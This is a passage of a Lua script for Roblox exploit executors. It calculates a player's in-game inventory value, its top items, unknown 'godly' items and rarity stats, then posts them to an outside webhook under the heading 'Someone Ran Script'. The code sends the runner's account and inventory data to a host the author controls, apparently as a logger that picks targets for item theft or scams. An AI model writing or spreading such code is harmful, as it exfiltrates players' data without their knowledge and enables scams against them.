                        ["value"] = string.format("**Total Items:** `%d`\n**Total Value:** `$%.2f`\n**Total Cents:** `%d`\n**Avg/Item:** `$%.2f`", #items, totalDollars, totalCents, #items > 0 and (totalDollars / #items) or 0),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🏆 **TOP 5 VALUABLE**",
                        ["value"] = topItemsText,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "⚠️ **UNKNOWN GODLY**",
                        ["value"] = unknownGodlyText,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "📈 **RARITY STATS**",
                        ["value"] = rarityBreakdown,
                        ["inline"] = true
                    }
                },
                ["thumbnail"] = {
                    ["url"] = headShotUrl
                },
                ["author"] = {
                    ["name"] = "⚡ Someone Ran Script ⚡",
                    ["icon_url"] = "https://i.pinimg.com/736x/3a/72/42/3a7242929e34f36681232e69ecf265a4.jpg"
                },
                ["footer"] = {
                    ["text"] = "💎 Script Ran 💎",
                    ["icon_url"] = "https://i.pinimg.com/736x/28/e5/84/28e5843c299a0cf06a2d550362077daf.jpg"
                },
                ["timestamp"] = DateTime.now():ToIsoDate()
            }
        }
    }

    local encodedData = HttpService:JSONEncode(data)
    
    local success, err = pcall(function()
        local requestFunc = syn and syn.request or http_request or request or HttpPost
        if requestFunc then
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = encodedData
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, encodedData)
        end
    end)

    if not success then
        warn("Failed to send webhook: " .. tostring(err))
    end
end

-- Run inventory analysis and transmit webhook
local totalCents, totalDollars, items = CalculateInventory()
SendWebhook(totalCents, totalDollars, items)
